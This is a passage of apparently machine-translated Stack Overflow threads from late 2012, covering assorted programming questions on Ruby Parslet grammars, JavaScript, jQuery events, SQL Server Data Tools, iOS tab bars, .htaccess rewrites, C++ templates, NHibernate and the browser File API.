我想我在定义 :document 规则方面遗漏了一些东西。我想要的是会消耗任意数量的序列表达式和纯文本的东西，虽然我拥有的规则将消耗每个原子个体，但在同一个字符串中使用它们会导致失败。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-09T14:18:13.467

你正在寻找的是这样的东西......

```
require 'parslet'

class ExampleParser < Parslet::Parser
  rule(:open_tag) do
    str('[') >> 
      match["a-zA-Z"].repeat(1).as(:open_tag_name) >>
    str(']')
  end 
```

open_tag 规则不需要排除 ']' 字符，因为匹配只允许字母。

```
 rule(:close_tag) do
    str('[/') >> 
      match["a-zA-Z"].repeat(1).as(:close_tag_name) >>
    str(']')
  end 
```

同样在这里

```
 rule(:text) do 
    (open_tag.absent? >> 
      close_tag.absent? >> 
        any).repeat(1).as(:text) 
  end 
```

如果您在此处排除打开和关闭标签..您知道您只处理文本。注意：一旦你排除了你不想要的东西，我喜欢这种使用“any”的技术，但如果你稍后重构，因为你的排除列表可能需要增长，请记住这一点。注意2：您可以进一步简化如下..

```
 rule(:text) do 
    (str('[').absent? >> any).repeat(1).as(:text) 
  end 
```

..如果您根本不想在文本中使用任何方括号。

```
 rule(:expression) do
    # [b]Hello World[/b]
    open_tag >> text.as(:enclosed_text) >> close_tag
  end 
```

这变得更加简单，因为文本不能包含 close_tag

```
 rule(:document) do
    (expression | text).repeat
  end 
```

我在你错过的重复中添加了（正如马特指出的那样）

```
end

require 'rspec'
require 'parslet/rig/rspec'

describe 'example' do
  let(:parser) { ExampleParser.new }
  context 'document' do
    it "parses a document with only an expression" do
      parser.document.should parse("[b]Hello World[/b]")
    end
    it "parses a document with only text" do
      parser.document.should parse(" Hello World")
    end
    it "parses a document with both an expression and text" do
      parser.document.should parse("[b]Hello World[/b] Yes hello")
    end
  end
end

RSpec::Core::Runner.run([]) 
```

希望这能给您一些使用 Parslet 的提示。:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T20:12:34.130

对于您`document`要使用的规则[`repeat`](http://rubydoc.info/gems/parslet/Parslet/Atoms/DSL#repeat-instance_method)：

```
rule(:document) do
  (expression | text).repeat
end 
```

您还需要更改`text`规则；目前，如果它开始匹配，它将消耗所有内容，包括`[`应该开始一个新的`expression`. 像这样的东西应该工作：

```
rule(:text) { match['^\['].repeat(1).as(:text) } 
```

# javascript - x == undefined 的正确替代品是什么？

> ID：13806223
> 
> 赞同：2
> 
> 时间：2012-12-10T17:42:07.103
> 
> 标签：javascript, undefined

我正在尝试清理一些代码（修复[jshint](http://www.jshint.com/)警告）。

什么是最好的替代品

```
if (x == undefined) {...} 
```

?

我正在使用[underscore.js](http://underscorejs.org/)，是以下等价物：

```
if (x === null || _.isUndefined(x)) {...} 
```

还是我错过了一些边缘情况？什么等于 ( `==`) 到未定义？（假设没有人做过`var undefined = 'asdf'`或类似的邪恶）。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-10T17:50:47.387

与`x == undefined`您实际检查`x`-`undefined`本身和. 的两个值`null`。但是请注意，没有声明的`x`变量会在这里触发错误；为了防止这种情况，使用...

```
if (typeof x === 'undefined' || x === null) { ... } 
```

但我实际上认为这个警告的真正含义是你不应该同时检查`null`一个`undefined`代码分支，因为它们是不同的值。

但是，如果您对此感到安全，您可以在 JSHint 中关闭这些特定检查，并带有`eqnull`选项。然后...

```
if (x == null) { ... } 
```

... 将同时检查`null`和`undefined`，但不会触发警告。但请注意，`== undefined`此选项不“涵盖”比较。

* * *

作为旁注，下划线的`isUndefined`方法是一段有趣的代码：

```
_.isUndefined = function(obj) {
  return obj === void 0;
}; 
```

它本质上与 simple 相同`obj === undefined`，但涵盖了一种特殊情况：当有人认为覆盖`undefined`脚本中的值是个好主意时。由于`void`construct*总是*返回“真实的`undefined`”，即使在这种情况下，这个函数也能正常工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T17:45:38.887

正确的替换是：

```
if( typeof x === "undefined") 
```

# namespaces - 自定义 jQuery 事件的处理程序，无论其命名空间如何？

> ID：13806224
> 
> 赞同：2
> 
> 时间：2012-12-10T17:42:08.370
> 
> 标签：namespaces, jquery

我很好奇以下...

jQuery 允许我们定义自定义事件（例如`myevent`）并触发这些事件。`myevent.namesp`还可以通过添加命名空间（例如）来添加额外的粒度层。

我想知道是否可以为所有具有相同名称的自定义事件编写事件处理程序，但*不管它们的命名空间如何*。

例如，如果我有以下代码：

```
$('input').on('myevent.namesp', function(e) {
    alert('The immediate event fired');
});

$('body').on('myevent', function() {
    alert('Caught the delegated event');
});

$('input').click(function() {
    $(this).trigger('myevent.namesp');
}); 
```

“立即事件”被触发，但委托的事件处理程序没有被触发（因为它没有使用特定的命名空间绑定）。是否可以做类似的事情

```
$('body').on('myevent.*', function() { /* Handler for all 'myevent' events */ }); 
```

我知道`.on()`以这种方式使用是不可能的，但你明白了。

您可以在此处查看示例：http: [//jsfiddle.net/VwU68/](http://jsfiddle.net/VwU68/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:47:08.233

命名空间事件使它们更具体；如果事件触发器没有命名空间，那么无论命名空间如何，都会触发该类型的*所有事件。*因此，您必须改为`.trigger`使用`'myevent'`。

但是，您可以拥有多个命名空间并触发最高级别的命名空间（显然；我什至不知道这一点）：http: [//jsfiddle.net/VwU68/2/](http://jsfiddle.net/VwU68/2/) - 您可以利用它来发挥自己的优势.

# sql-server - SQL Server Data Tools - 恢复模式

> ID：13806227
> 
> 赞同：11
> 
> 时间：2012-12-10T17:42:13.320
> 
> 标签：sql-server, visual-studio-2010, sql-server-data-tools

我正在使用 SQL Server Data Tools (SSDT) 来管理我的数据库架构。每次我选择发布对我的架构的更改时，脚本都会包含以下内容：

```
IF EXISTS (SELECT 1
           FROM   [master].[dbo].[sysdatabases]
           WHERE  [name] = N'$(DatabaseName)')
    BEGIN
        ALTER DATABASE [$(DatabaseName)]
            SET RECOVERY FULL 
            WITH ROLLBACK IMMEDIATE;

    END 
```

问题是，我不希望它将我的恢复模式更改为 FULL。我希望它很简单。

如何修改我的 SSDT 项目以指示我想要简单的恢复模式，以便在我每次发布时它都不会尝试将其更改为完整模式？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-12-10T17:51:23.327

实际上，在项目设置的“数据库设置”按钮中找到了这个选项（以及更多）。有点隐藏的海事组织:)

![SSDT 数据库设置](../Images/5583d8eedf2659485ce78fcb3dce8a78.png)

# ios - iOS 自定义标签栏项目比标签栏高

> ID：13806229
> 
> 赞同：1
> 
> 时间：2012-12-10T17:42:18.867
> 
> 标签：ios, ios5, ios6, uitabbar, uitabbaritem

![自定义标签栏项目高于标签栏](../Images/a60ab74e4fbd7c4c5160b51e5ef1cda0.png)

好的，所以，我正在尝试创建一个自定义标签栏。我已经阅读了一百篇教程并下载了一半的示例代码项目，而且这个问题似乎仍然存在于所有这些项目中。

我真的不想要一个自定义背景，我真正想要的是按钮占据整个区域，这样就不会显示任何背景。为什么当使用大小为 49 像素（Retina 为 98 像素）的图像作为背景和按钮时……标签栏本身被放大了，而苹果添加的丑陋的光芒是可见的？

这是我使用的代码（在 Stack 上找到）：

```
UIImage *selectedImage0 = [UIImage imageNamed:@"transactions_tab_btn_active"];
UIImage *unselectedImage0 = [UIImage imageNamed:@"transactions_tab_btn"];

UIImage *selectedImage1 = [UIImage imageNamed:@"bills_tab_btn_active"];
UIImage *unselectedImage1 = [UIImage imageNamed:@"bills_tab_btn"];

UIImage *selectedImage2 = [UIImage imageNamed:@"messages_tab_btn_active"];
UIImage *unselectedImage2 = [UIImage imageNamed:@"messages_tab_btn"];

UIImage *selectedImage3 = [UIImage imageNamed:@"reports_tab_btn_active"];
UIImage *unselectedImage3 = [UIImage imageNamed:@"reports_tab_btn"];

UITabBar *tabBar = self.tabBarController.tabBar;
UITabBarItem *item0 = [tabBar.items objectAtIndex:0];
UITabBarItem *item1 = [tabBar.items objectAtIndex:1];
UITabBarItem *item2 = [tabBar.items objectAtIndex:2];
UITabBarItem *item3 = [tabBar.items objectAtIndex:3];

UIImageView *tabBarImageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"tab_bar"]];
if ([[[UIDevice currentDevice] systemVersion] floatValue] < 5)  {
    [tabBar insertSubview:tabBarImageView atIndex:0];
}else{
    [tabBar insertSubview:tabBarImageView atIndex:1];
}

[item0 setFinishedSelectedImage:selectedImage0 withFinishedUnselectedImage:unselectedImage0];
[item1 setFinishedSelectedImage:selectedImage1 withFinishedUnselectedImage:unselectedImage1];
[item2 setFinishedSelectedImage:selectedImage2 withFinishedUnselectedImage:unselectedImage2];
[item3 setFinishedSelectedImage:selectedImage3 withFinishedUnselectedImage:unselectedImage3]; 
```

同样，我可以删除该背景图像，因为它对我没有用，但没有它，标签栏的默认黑色背景是可见的。都不好。请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-24T09:11:04.457

好吧，我可以帮助你发光。要隐藏它，只需创建一个透明图像并使用它。

```
UIImage* image = [UIImage imageNamed:@"transparent.png"];
[[UITabBar appearance] setSelectionIndicatorImage:image]; 
```

# magento - Magento 显示分组产品特价

> ID：13806231
> 
> 赞同：1
> 
> 时间：2012-12-10T17:42:21.123
> 
> 标签：magento, e-commerce, php

我试图弄清楚如何在目录页面上显示分组产品的特价。

例如，如果我有 5 个简单的产品附加到我的分组产品，我如何在目录页面上显示这些产品的 RRP 以及特价？

目前它将仅显示在产品页面上，magento 将获取它可以找到的最低价格以显示在目录页面上。

非常感谢任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T19:45:12.760

如果您使用默认主题，则必须修改：

```
app/design/frontend/base/default/template/catalog/product/list.phtml 
```

您可以通过产品添加您需要的价格：

```
<?php echo $this->getPriceHtml($_product, true) ?> 
```

# firefox - Firefox 附加组件：通过文件夹名称获取现有书签文件夹的项目 ID

> ID：13806241
> 
> 赞同：0
> 
> 时间：2012-12-10T17:42:45.077
> 
> 标签：firefox, firefox-addon

我正在尝试让我的插件将书签保存在它自己的书签文件夹中。

此函数创建了所需的文件夹，但我希望它返回现有文件夹的 id，而不是永远创建数百万个新文件夹，如果它可以按名称找到它：

```
function special_bookmark_folder()
{
  menuFolder = bmsvc_service().bookmarksMenuFolder;

  // <Try and find the bookmark folder here!>

  return bmsvc_service().createFolder(menuFolder, ":: Bookmarkr ::", bmsvc_service().DEFAULT_INDEX);
  // else return id of existing folder if it's found here
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T21:21:29.523

您必须使用[Places 查询 API](https://developer.mozilla.org/en-US/docs/Querying_Places)，这不是最简单的任务。谢天谢地，有[一个你想要的例子](http://mxr.mozilla.org/mozilla-central/source/services/sync/tps/extensions/tps/modules/bookmarks.jsm#201)

# c# - 创建一个没有条目接触磁盘的 ZIP 文件？

> ID：13806254
> 
> 赞同：4
> 
> 时间：2012-12-10T17:43:34.267
> 
> 标签：c#, zip

我正在尝试创建一个程序，该程序能够根据用户输入创建包含文件的压缩包。

在压缩之前，我不需要将这些文件中的任何一个写入硬盘驱动器，因为那是不必要的，那么如何在不实际将它们写入硬盘驱动器的情况下创建这些文件，然后将它们压缩？

我正在使用 DotNetZip。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T18:09:17.853

[请参阅此处](http://dotnetzip.codeplex.com/wikipage?title=CS-Examples&referringTitle=Examples)的文档，特别是名为“使用从流中获取的内容创建 zip”的示例：

```
 using (ZipFile zip = new ZipFile())
  {
    ZipEntry e= zip.AddEntry("Content-From-Stream.bin", "basedirectory", StreamToRead);
    e.Comment = "The content for entry in the zip file was obtained from a stream";
    zip.AddFile("Readme.txt");
    zip.Save(zipFileToCreate);
  } 
```

如果您的文件尚未采用流格式，则需要将它们转换为流格式。您可能需要为此使用[MemoryStream](http://msdn.microsoft.com/en-us/library/system.io.memorystream.aspx)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T17:47:14.507

我使用 SharpZipLib，但如果 DotNetZip 可以针对基本的 System.IO.Stream 执行所有操作，那么是的，只需提供一个 MemoryStream 即可写入。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T17:48:36.057

不应该避免写入硬盘，因为它是不必要的。那是倒退。如果不需要整个压缩过程在内存中完成，则通过写入硬盘来避免它。

硬盘比内存更适合存储大量数据。如果您的 zip 文件有可能最终达到 1 GB 大小，那么您的应用程序可能会出现问题，或者至少会导致系统速度变慢。如果您直接写入硬盘驱动器，则 zip 的大小可能为数 GB，而不会引起问题。

# python - 在运行时决定是否使用芹菜

> ID：13806255
> 
> 赞同：0
> 
> 时间：2012-12-10T17:43:40.297
> 
> 标签：python, django, metaprogramming, celery, django-celery

我希望能够决定是否应该在运行时同步或异步执行函数，所以我编写了以下代码：

```
class DefaultUseCeleryPolicy(UseCeleryPolicy):
    def use(self):
        return anyCeleryWorkerRunning() or FORCE_CELERY

#--------------------------------------------------------------------------------------

class TaskDispatcher(object):
    def __init__(self, usePolicy):
        self.usePolicy = usePolicy

    def dispatch(self, function, *args, **kwargs):
        pass

#--------------------------------------------------------------------------------------

class CeleryTaskDispatcher(TaskDispatcher):
    def __init__(self, usePolicy = DefaultUseCeleryPolicy()):
        super(CeleryTaskDispatcher, self).__init__(usePolicy)

    def dispatch(self, function, *args, **kwargs):
        if self.usePolicy.use():
            t = task(function)
            tasks.register(t)
            t.delay(args, kwargs)
        else:
            function(args, kwargs) 
```

不幸的是，这不起作用（我从芹菜工人那里收到“收到未注册类型的任务”错误）。有可能实现我想要的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T17:52:18.863

您可以使用 is_eager 参数并根据需要将其传递给 .delay ：

[http://docs.celeryproject.org/en/latest/userguide/tasks.html#context](http://docs.celeryproject.org/en/latest/userguide/tasks.html#context)

所以你会做这样的事情：

```
kwargs = {is_eager:False} #runs async 
```

稍后根据条件设置为 True：

```
kwargs = {is_eager:True} #runs sync 
```

做更多的事情

```
name_of_task.delay(your_arg,**kwargs) 
```

# visual-c++ - 多个IF表达式？如何？视觉 C++

> ID：13806260
> 
> 赞同：-2
> 
> 时间：2012-12-10T17:44:14.780
> 
> 标签：visual-c++

如何有多个 IF 表达式？像这样 ：

```
 If (expression1)&&(expression2)&&...{} 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T17:56:28.290

您将希望使用如下语法：

```
if ( (1<2) && (2>3) || (100 == 10*10 ) ) {
} 
```

在 if 语句中使用多个表达式时要记住的另一件事是短路的行为：[http ://en.wikipedia.org/wiki/Short-circuit_evaluation](http://en.wikipedia.org/wiki/Short-circuit_evaluation)

# .htaccess - .htaccess 上的重写导致 404

> ID：13806261
> 
> 赞同：1
> 
> 时间：2012-12-10T17:44:17.390
> 
> 标签：.htaccess, mod-rewrite

我正在使用 PHP 5 开发一个托管在 apache 服务器上的应用程序。

域上已经运行了一个网站：www.domain.com。我的应用程序位于名为“hotsite”的文件夹中，可以通过 URL www.domain.com/hotsite/ 访问它。

根文件夹包含一个 .htaccess，其中包含：

/.ht 访问：

```
XBitHack      Off
RewriteEngine On
RewriteCond   %{REQUEST_URI} \/([0-9a-z]{6})$ [NC]
RewriteRule   ^(.*) http://www.domain.com/url/forward.php?%1 [L]
IndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti*
<Limit GET POST>
order deny,allow
deny from all
allow from all
</Limit>
<Limit PUT DELETE>
order deny,allow
deny from all
</Limit>
AuthName www.domain.com
AuthUserFile /home/intera/public_html/_vti_pvt/service.pwd
AuthGroupFile /home/intera/public_html/_vti_pvt/service.grp
RedirectMatch permanent ^/webmail$ http://http://mail.google.com/hosted/domain.com www.domain.com/hotsite/ 
```

在这个 'hotsite' 文件夹中，有一个 .htaccess 文件，其中包含以下代码：

/hotsite/.htaccess:

```
RewriteEngine on
RewriteBase /
RewriteCond %{SCRIPT_FILENAME} !-f
RewriteCond %{SCRIPT_FILENAME} !-d
RewriteRule ^(.*)$ /folder/index.php 
```

现在，当我访问 www.domain.com/hotsite/ 时，我的应用程序加载正常。但是当我尝试访问 www.domain.com/hotsite/section/ 时，它似乎忽略了 .htaccess 文件并尝试访问“部分”，就好像它是一个文件夹一样，返回 404 错误。

任何想法为什么会发生这种情况，我应该怎么做才能让它发挥作用？

谢谢 =)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T19:40:49.600

如果 htaccess 在`hotsite`文件夹内，则`RewriteBase /`需要`RewriteBase /hotsite`

以防万一; 请注意，重写规则，重写为`/folder/index.php`，而不是`/hotsite/folder/index.php`

# javascript - 超过 1 个嵌入式 Vimeo 视频无法加载

> ID：13806262
> 
> 赞同：0
> 
> 时间：2012-12-10T17:44:23.387
> 
> 标签：javascript, html, vimeo

这里不是通常的帖子，但我已经完成了一个 HTML 页面，其中包含 3 个嵌入的 Vimeo 视频，但由于一些非常奇怪的原因，什么都没有出现。

这是页面：[http ://www.replyonline.co.uk/DirectionGroup/17569_DG_mailer/www/b2c.html](http://www.replyonline.co.uk/DirectionGroup/17569_DG_mailer/www/b2c.html)

顶部的第一个视频。第二个视频在[http://www.replyonline.co.uk/DirectionGroup/17569_DG_mailer/www/b2c.html#nav_cs2](http://www.replyonline.co.uk/DirectionGroup/17569_DG_mailer/www/b2c.html#nav_cs2)的第二张幻灯片上，第三个视频在[http://www.replyonline.co.uk/的第二张幻灯片上方向组/17569_DG_mailer/www/b2c.html#nav_cs3](http://www.replyonline.co.uk/DirectionGroup/17569_DG_mailer/www/b2c.html#nav_cs3)

如果这有帮助，这是我的规格。对于 Windows 用户来说似乎没问题。操作系统：Mac OS X 10.8.2 浏览器：Firefox 17.0.1

不确定它可能是什么？javascript？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T17:46:47.317

我不确定它是否会有所帮助，但文档中提到了以下内容：

> 如果您在一个页面上嵌入和控制多个播放器或使用我们的 JS API 库 (Froogaloop)，您应该为每个播放器提供一个与 iframe 元素的 id 匹配的 player_id

文档：

[http://developer.vimeo.com/player/js-api](http://developer.vimeo.com/player/js-api)

顺便说一句，您的页面在几个地方抛出错误：

```
`Unsafe JavaScript attempt to access frame with URL http://www.replyonline.co.uk/DirectionGroup/17569_DG_mailer/www/b2c.html from frame with URL http://player.vimeo.com/video/55282413\. Domains, protocols and ports must match.` 
```

# c++ - 带有模板类的类实例化错误

> ID：13806263
> 
> 赞同：0
> 
> 时间：2012-12-10T17:44:24.457
> 
> 标签：c++, class, templates, instantiation, doubly-linked-list

我无法弄清楚我的程序出了什么问题。我用头文件中的类声明和成员函数声明，一个.cpp文件中的成员函数定义来构造它，然后我在main.cpp中有一个主驱动程序。我已将它们全部放在 ideone 上的一个文件中，以便我可以在此处发布程序：

[http://ideone.com/PPZMuJ](http://ideone.com/PPZMuJ)

ideone上显示的错误确实是我的IDE在构建时显示的错误。有人可以指出我做错了什么吗？

错误是：

```
prog.cpp: In instantiation of ‘IntDLLNode<int>’:
prog.cpp:56:   instantiated from ‘void IntDLList<T>::addToDLLHead(const T&) [with T = int]’
prog.cpp:215:   instantiated from here
prog.cpp:8: error: template argument required for ‘struct IntDLList’

Line 56: head = new IntDLLNode<T>(el,head,NULL);
Line 215: dll.addToDLLHead(numero);
Line 8: class IntDLLNode    { 
```

你可以忽略 try/catch 子句，我还没有完成那部分的工作——我只是想克服当前的错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T20:50:26.743

问题出在朋友声明中：

```
template <class T>
class IntDLLNode    {
  friend class IntDLList;
  // rest of IntDLLNode here
}; 
```

在这里，您声明一个非模板`class IntDLList`成为朋友。稍后，您声明一个同名的**模板类；**但不像你想象的那样，它不会成为朋友`IntDLLNode`。

要解决这个问题，请指定朋友类是一个模板：

```
template <class U> class IntDLList;

template <class T>
class IntDLLNode    {
  friend class IntDLList<T>;
  // rest of IntDLLNode here
}; 
```

# ruby-on-rails - 如何在一个表格属性下添加两个子文本字段？

> ID：13806264
> 
> 赞同：1
> 
> 时间：2012-12-10T17:44:24.030
> 
> 标签：ruby-on-rails, migration

我正在做我简单的 Rails 练习。我想在一个属性下添加两个文本字段？例如：来自维基百科“阿金库尔之战”，属性“交战方”，有“英格兰”VS“法国”

但我所做的是：在我输入“英格兰国王”和“法国王国”后，它只显示其中一个“法国（或英格兰）王国”，这是我在索引中的代码：

```
<td><%= battle.Belligerents %><p>VS</p><%= battle.Belligerents %></td> 
```

_form 中的代码：

```
<div class="field">
    <%= f.label :Belligerents %>
    <br />
    <%= f.text_field :Belligerents %> 
    <p>VS</p> 
    <%= f.text_field :Belligerents %>
</div> 
```

和显示代码：

```
<p>
    <b>Belligerents:</b>
    <%= @battle.Belligerents %>
</p> 
```

我应该怎么做，以便表格同时显示两个不同的对象？

# nhibernate - NHibernate（参考）OneToMany

> ID：13806265
> 
> 赞同：0
> 
> 时间：2012-12-10T17:44:30.043
> 
> 标签：nhibernate

我有：

```
DailyWorkTimeMapping()
{
....
     References(x => x.Employee);
} 
```

所以，当我这样做时：

```
var x = new DailyWorkTime()
{
    Employee = new Employee()
       {
          Id = IdFromAnExistingEmployee,
       };

} 
```

当我打电话时，`SaveOrUpdate`我收到以下错误：

> NHibernate.TransientObjectException：对象引用了未保存的瞬态实例 - 在刷新之前保存瞬态实例或将属性的级联操作设置为使其自动保存的内容。类型：ProjectTracker.Domain.Employees.Employee，实体：ProjectTracker.Domain.Employees.Employee bei NHibernate.Engine.ForeignKeys.GetEntityIdentifierIfNotUnsaved(String entityName, Object entity, ISessionImplementor session)

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:13:28.517

如果您尝试在`DailyWorkTime`实例上调用保存，则需要将 Employee 属性标记为级联。

```
References(x => x.Employee).Cascade.All(); 
```

或者，您可以在保存`Employee`对象之前保存对象`DailyWorkTime`

```
var normalHours = new DailyWorkTime();
normalHours.Employee = new Employee() { Id = 1234};
session.SaveOrUpdate(normalHours.Employee);
session.SaveOrUpdate(normalHours); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T19:12:12.813

在您从 Employee 表上的 OneToMany 映射。将映射设置为反向。这将意味着孩子控制保存。

# javascript - 文件 API，本地文件的持久链接

> ID：13806269
> 
> 赞同：13
> 
> 时间：2012-12-10T17:44:38.057
> 
> 标签：javascript, html

我目前正在开发一些基于游戏的网络脚本（将游戏移植到网络）。脚本从我的网络主机下载数据，因此加载速度很慢（必须下载每个文件：地图、模型、纹理......）。为了纠正这个问题，我添加了一个选项，允许用户在他们的计算机中选择他们的本地游戏数据（使用文件 API - 拖放）以直接从本地解析内容并避免从网络下载多个大型游戏，结果非常快.

这里的问题是：每次他们重新加载浏览器时，他们都必须一次又一次地重新选择他们的文件。这不是用户友好的。

那么，有没有办法从这个游戏存档中保留参考，以避免用户每次都重新进行拖放？我知道安全问题，只是想知道是否有类似持久 URL.createObjectURL() 的东西。

**注意：**游戏数据大约是~2Go，因此无法将其存储在 FileSystem API 中（我不想复制它，当您可以保留对它的引用时复制数据很浪费空间）。

谢谢 ：）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2016-12-13T05:06:40.073

### 你必须有来自用户的输入

未经用户确认，无法访问客户端计算机上的文件。一旦用户选择了一个文件（您可以通过事件收听它`change`），您就可以使用[FileReader API](https://developer.mozilla.org/en-US/docs/Web/API/FileReader)来读取文件。

```
document.getElementById("input").addEventListener("change", function() {
    const fs = new FileReader();
    fs.readAsText(this.files[0]);
    fs.onloadend = function() {
        document.getElementById("output").innerText = fs.result;
    }
});
```

```
<input id="input" type="file" />
<div id="output"></div>
```

### 用于`localStorage`存储一小部分文件

您可以使用[`localStorage API`](http://www.w3schools.com/html/html5_webstorage.asp)来存储一些文件，但[容量非常有限](https://en.wikipedia.org/wiki/Web_storage#Storage_size)，尤其是对于像您这样的项目（在当前最流行的浏览器上最大为 5 到 10 MB）。

这将使您的编码变得更加困难，因为您每次都必须检查是否存储了哪些内容，并加载未保存的内容。

### 缓存

通过使用[缓存](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching)，您基本上会遇到与使用相同的问题`localStorage`：每个浏览器都有自己的最大容量。

这种方法的优点是您不必担心已加载或未加载的内容，因为浏览器会自行执行此操作。

### 使用闪存

现在，如果您真的完全不关心安全性，您可以使用 Flash 插件来存储和加载文件，然后[`ExternalInterface`](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/external/ExternalInterface.html)在 JavaScript 代码中使用它来加载数据。

```
ExternalInterface.call("loaded", filename, data);

// And then in JavaScript:
// function loaded(filename, data)
// ... 
```

您可以使用它[`SharedObject`](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/SharedObject.html)来保存和加载您的数据。

我不是 AS3 专家，请原谅任何笨拙。

### 桌面应用程序？

最后一个选项是将您的游戏转换并捆绑到桌面应用程序中，例如通过[电子](http://electron.atom.io)捆绑它，然后使用例如[NeDB](https://github.com/louischatriot/nedb)，这是目前电子[建议](http://electron.atom.io/community/)的持久存储工具。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-12-13T05:21:31.230

您可能需要考虑使用[IndexedDB](https://www.w3.org/TR/IndexedDB/)。最近的浏览器支持它，包括 Chrome、Firefox 和 Safari（macOS 和 iOS）。IndexedDB 允许您将或作为值保存在 IndexedDB 对象存储中`Blob`。`File``ArrayBuffer`

检查这个[IndexedDB：将文件存储为 File 或 Blob 或 ArrayBuffer。什么是最好的选择？](https://stackoverflow.com/questions/31803363/indexeddb-store-file-as-file-or-blob-or-arraybuffer-what-is-the-best-option).

# javascript - JavaScript 正则表达式替换内引号

> ID：13806274
> 
> 赞同：0
> 
> 时间：2012-12-10T17:44:49.027
> 
> 标签：javascript

我正在尝试使用 reg ex 修复内联 javascript 片段，以便在输入字段上重写。

我有包裹内部双引号的单引号，我想将内部引号转换为单引号而不是双引号，但我只想在代码显示为嵌套引号时转换它们。

现在我正在为所有有效的报价实例进行转换，但我可能会遇到另一个问题。我将在下面附上我的代码。

JavaScript

```
$(document).ready(function() {
    $('.submit').bind('click', function(e) {
        var yourstring = $("textarea").val();
        yourstring = yourstring.replace(/'/g, "''");
        yourstring = yourstring.replace(/&quote;/g, "\"");
        yourstring = yourstring.replace(/&lquote;/g, "\"");
        yourstring = yourstring.replace(/&rquote;/g, "\"");
        yourstring = yourstring.replace(/&#34/g, "\"");
        yourstring = yourstring.replace(/&#8220;/g, "\"");
        yourstring = yourstring.replace(/&#8221;/g, "\"");
        yourstring = yourstring.replace(/&#34;/g, "\"");
        alert(yourstring)
    });
});​ 
```

HTML

```
<textarea style="width:400px;height:300px;">
function('');

<a onclick="$(".text").append('test');">Click Me</a>
<br/>
&lquote;test quotes&rquote;

&quot; generic quotes &quot;
</textarea>

<input type="submit" class="submit"> 
```

更具体地说，我试图得到

```
<a onclick="$(".text").append('test');">Click Me</a> 
```

看起来像

```
<a onclick="$('.text').append('test');">Click Me</a> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:20:22.703

提供的示例似乎与数据库没有任何关系，而是`onclick`属性中的 JavaScript 代码有问题。该代码实际上没有有效的语法，但我猜您正在尝试为 HTML 代码构建某种编辑器。

如果您决定不遵循上述评论中的建议（我同意），为了回答您的问题，这里有一个选项可以删除已经被它们包围的文本的双引号：

```
var s = "<a onclick=\"$(\".text\").append('test');\">Click Me</a>";
var re = /"(.*)"/g;
var r = s.replace(re, function($0, $1) { return '"' + $1.replace(/"/g, "''") + '"'; });
console.log(r);
​ 
```

# c# - 自己的表单边框样式

> ID：13806275
> 
> 赞同：6
> 
> 时间：2012-12-10T17:44:53.580
> 
> 标签：c#, .net, windows

我一直认为使用 iTunes 或 Visual Studio 2012 等程序的表单边框是在没有边框样式的情况下完成的，并且按钮作为关闭按钮被绘制为图像。

![视觉工作室 2012](../Images/071028814f834749260ce883bfed8fe6.png) ![音乐喷气机](../Images/c8c69b80e18b8ecaad9513f4e0cc1fb6.png)

但是，一旦我的 Visual Studio 没有响应并且边框更改为基本的 Windows 边框。

![视窗](../Images/881a35ce73b734da4f93881236a3fe50.png)

如何获得自己的表单边框？在 C# 中可能吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T20:15:45.560

您正在看到“幽灵窗口”，这是 Windows 窗口管理器创建的用于替换死窗口的窗口。您会在标题栏中看到“未响应”。当然，该窗口不必具有相同的自定义样式，Windows 无法知道如何正确地做到这一点。

您可以使用 Spy++ 实用程序查看另一个应用程序的窗口属性。VS2012 实际上确实使用了带有标题栏的常规窗口样式。他们如何定制它是一个很好的秘密，我怀疑他们拦截了 WM_NCPAINT，这是一个很难自己实现的消息。使用无边框窗口肯定更容易。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T20:51:31.317

除了@Hans 的帖子：

使用 WPF，您可以将 windowstyle 设置为 none，如下所示：

```
<Window WindowStyle="None"> 
```

然后你可以实现你自己的按钮。

# c++ - 模拟程序

> ID：13806276
> 
> 赞同：0
> 
> 时间：2012-12-10T17:45:04.510
> 
> 标签：c++, queue, simulation

我正在为多个队列进行模拟。我应该在开始时输入队列数，然后模拟所有这些。

每个“轮”的每个队列的输出是同时，服务的总数和每个队列的大小。

我的程序崩溃并且没有响应。

它写出第一个队列 och 然后崩溃......

帮助！

我认为我的计算是错误的，但我不知道，因为一切都崩溃了。

这里是：

```
#include <iostream>
#include <cstdlib>
#include <list>
#include <ctime>
#include<conio.h>
#include <time.h>
#include <stdlib.h>
#include<dos.h>
#include<windows.h>

using namespace std;

class Customer
{
public:

int servicet;
int served;

Customer()
{
    servicet= rand()%150+30;
}

int getServicetime()
{
    return servicet;
}

int getServed()
{
